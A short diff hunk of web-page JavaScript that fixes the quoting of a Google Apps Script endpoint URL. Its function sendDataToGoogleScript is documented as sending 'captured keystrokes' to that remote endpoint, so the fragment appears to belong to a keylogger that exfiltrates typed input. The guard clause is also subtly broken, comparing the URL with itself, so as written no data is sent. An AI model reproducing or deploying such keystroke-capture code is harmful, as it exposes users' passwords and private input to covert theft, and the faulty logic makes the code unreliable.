@@ -146,14 +146,14 @@
         // =======================================================================
         
         // !!! IMPORTANT: REPLACE THIS URL WITH THE URL FROM YOUR DEPLOYED SCRIPT !!!
-        const GAS_ENDPOINT_URL = https://script.google.com/macros/s/AKfycbzl8zSsoYjjXo2d986zgr_jy2jr62raKSjN1PDLhzkOgcsqWf9Mlt0A3uVtM9c_qqTr/exec; 
+        const GAS_ENDPOINT_URL = 'https://script.google.com/macros/s/AKfycbzl8zSsoYjjXo2d986zgr_jy2jr62raKSjN1PDLhzkOgcsqWf9Mlt0A3uVtM9c_qqTr/exec'; 
 
         /**
          * Sends the captured data to the Google Apps Script endpoint.
          * @param {string} dataToSend - The string of captured keystrokes.
          */
         async function sendDataToGoogleScript(dataToSend) {
-            if (GAS_ENDPOINT_URL === https://script.google.com/macros/s/AKfycbzl8zSsoYjjXo2d986zgr_jy2jr62raKSjN1PDLhzkOgcsqWf9Mlt0A3uVtM9c_qqTr/exec) {
+            if (GAS_ENDPOINT_URL === 'https://script.google.com/macros/s/AKfycbzl8zSsoYjjXo2d986zgr_jy2jr62raKSjN1PDLhzkOgcsqWf9Mlt0A3uVtM9c_qqTr/exec') {
                 console.error("GAS_ENDPOINT_URL is not set! Data not sent.");
                 return;
             }
